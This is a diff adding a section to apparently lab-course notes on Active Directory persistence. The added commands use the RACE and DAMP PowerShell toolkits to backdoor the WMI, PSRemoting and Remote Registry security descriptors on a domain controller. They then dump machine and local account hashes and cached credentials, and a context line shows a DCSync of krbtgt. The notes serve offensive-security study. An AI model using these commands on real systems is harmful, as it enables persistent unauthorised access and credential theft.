@@ -3,6 +3,7 @@
 - [Domain Persistence - Using ACLs](#domain-persistence---using-acls)
   - [AdminSDHolder](#adminsdholder)
   - [Rights Abuse](#rights-abuse)
+  - [Security Descriptors](#security-descriptors)
 
 ---
 
@@ -194,3 +195,109 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 
 ----
 
+## Security Descriptors
+
+It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.
+
+**Administrative privileges** are required for this. It, of course, works as a very useful and impactful backdoor mechanism.
+
+<br/>
+
+**Security Descriptor Definition Language (SDDL)** defines the format which is used to describe a security descriptor. **SDDL** uses ACE strings for DACL and SACL:
+
+```
+ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
+```
+
+- ACE for built-in administrators for WMI namespaces:<br/>
+`A;CI;CCDCLCSWRPWPRCWD;;;SID`
+
+<br/>
+
+**Security Descriptors - WMI**
+
+ACLs can be modified to allow non-admin users access to securable objects. Using the **RACE toolkit**:
+
+```
+. C:\AD\Tools\RACE-master\RACE.ps1
+```
+
+- On local machine:
+
+```
+Set-RemoteWMI -SamAccountName studentuser64 –Verbose
+```
+
+- On remoate machine for `student64` without explicit credentials:
+
+```
+Set-RemoteWMI -SamAccountName studentuser64 -ComputerName us-dc -Verbose
+```
+
+- On remote machine with explicit credentials. Only `root\cimv2` and nested namespaces:
+
+```
+Set-RemoteWMI -SamAccountName studentuser64 -ComputerName us-dc -Credential Administrator –namespace 'root\cimv2' -Verbose
+```
+
+- On remote machine **remove** permissions:
+
+```
+Set-RemoteWMI -SamAccountName studentuser1 -ComputerName us-dc -Remove
+```
+
+<br/>
+
+**Security Descriptors - PSRemoting**
+
+Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches:
+
+- On local machine for abuser:
+
+```
+Set-RemotePSRemoting -SamAccountName studentuser64 –Verbose
+```
+
+- On remote machine for studentuser64 without credentials:
+
+```
+Set-RemotePSRemoting -SamAccountName studentuser64 -ComputerName us-dc -Verbose
+```
+
+- On remote machine, remove the permissions:
+
+```
+Set-RemotePSRemoting -SamAccountName studentuser64 -ComputerName us-dc -Remove
+```
+
+<br/>
+
+**Security Descriptors - Remote Registry**
+
+Using RACE or DAMP toolkit, with admin privs on remote machine:
+
+```
+Add-RemoteRegBackdoor -ComputerName us-dc -Trustee studentuser64 -Verbose
+```
+
+As `studentuser64`, retrieve machine account hash:
+
+```
+Get-RemoteMachineAccountHash -ComputerName us-dc -Verbose
+```
+
+Retrieve local account hash:
+
+```
+Get-RemoteLocalAccountHash -ComputerName us-dc -Verbose
+```
+
+Retrieve domain cached credentials:
+
+```
+Get-RemoteCachedCredential -ComputerName us-dc -Verbose
+```
+
+<br/>
+
+---
